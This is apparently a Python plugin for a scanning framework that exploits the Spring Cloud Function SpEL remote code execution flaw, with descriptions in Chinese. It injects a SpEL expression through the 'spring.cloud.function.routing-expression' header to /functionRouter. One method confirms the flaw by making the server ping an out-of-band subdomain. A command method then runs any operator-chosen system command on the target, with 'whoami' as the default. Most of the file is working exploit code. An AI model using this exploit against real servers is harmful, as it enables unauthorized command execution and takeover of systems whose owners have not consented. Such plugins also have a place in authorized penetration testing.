# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Spring Cloud Function SpEL 远程代码执行漏洞",
        "description": "SpringCloud Function作为SpringCloud家族成员最早在2017年提出，旨在为快速发展的Serverless市场提供一个Spring的接入路径，使用SpringCloud Function进行无服务（我这里直接称为函数式编程）的项目开发可以大大节约成本，同时对于SpringBoot熟悉的人可以迅速上手",
        "references": [],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            self.request(
                method='post',
                path='./functionRouter',
                headers={
                    "spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec(\"ping -c 1 {subdomain}\")"
                },
            )
            if execute.verify():
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exe_cmd(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './functionRouter'),
            headers={
                "spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")"
            },
        )
        if r.status_code == 200:
            self.log.warn("命令执行无回显")
